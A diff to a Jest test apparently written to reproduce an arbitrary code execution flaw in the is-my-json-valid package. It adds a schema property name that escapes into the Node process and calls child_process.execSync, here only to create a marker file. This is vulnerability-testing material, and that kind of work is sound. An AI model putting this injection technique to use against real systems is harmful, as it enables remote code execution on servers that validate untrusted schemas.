@@ -1,15 +1,18 @@
 test("Arbitrary code execution in is-my-json-valid", () => {
   expect.assertions(2);
   const fs = require("fs");
-  const validator = require("is-my-json-valid");
   const path = "./is-my-json-valid";
-  const sleep = require("sleep");
+  try {
+      fs.unlinkSync(path, function (err) {});
+  } catch (error) {}
   file_exist = fs.existsSync(path);
-  expect({}.polluted).toBe(undefined);
+  expect(file_exist).toBe(false);
+
+  const validator = require("is-my-json-valid");
   const schema = {
     type: "object",
     properties: {
-      "x[1 + (Object.prototype.polluted='yes')]": {
+        "x[1 + (this.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch ./is-my-json-valid'))]": {
         required: true,
         type: "string",
       },
@@ -18,8 +21,9 @@ test("Arbitrary code execution in is-my-json-valid", () => {
   try {
     let validate = validator(schema);
     validate({});
-  } catch (e) {}
-  file_exist = fs.existsSync(path);
-  expect({}.polluted).toBe("yes");
-  fs.unlink(path, function (err) {});
+  } catch (e) {console.log(e)}
+
+   file_exist = fs.existsSync(path);
+   expect(file_exist).toBe(true);
+   fs.unlink(path, function (err) {});
 });
